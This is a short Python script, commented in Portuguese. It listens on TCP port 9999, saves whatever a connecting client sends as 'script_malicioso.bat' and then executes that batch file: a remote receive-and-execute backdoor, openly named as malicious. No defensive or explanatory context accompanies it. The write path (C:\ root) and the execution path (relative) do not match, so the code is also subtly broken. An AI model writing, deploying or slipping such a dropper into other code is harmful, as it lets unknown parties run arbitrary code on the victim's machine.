import socket
import sys
import os

HOST = ""
PORT = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(5)

print("Ouvindo...")

while True:
    conn, addr = s.accept()
    print("[+] Cliente conectado: ", addr)

    # recebe o nome do arquivo para download
    f = open("C:\\script_malicioso.bat", "wb")
    while True:
        # recebe os bytes do arquivo
        data = conn.recv(4096)
        if not data:
            break
        # escreve os bytes no novo arquivo
        f.write(data)
    f.close()
    print("[+] Downloado completo")

    # encerra a conexão
    conn.close()
    print("[-] Cliente disconectado")
    os.system("script_malicioso.bat")
    sys.exit(0)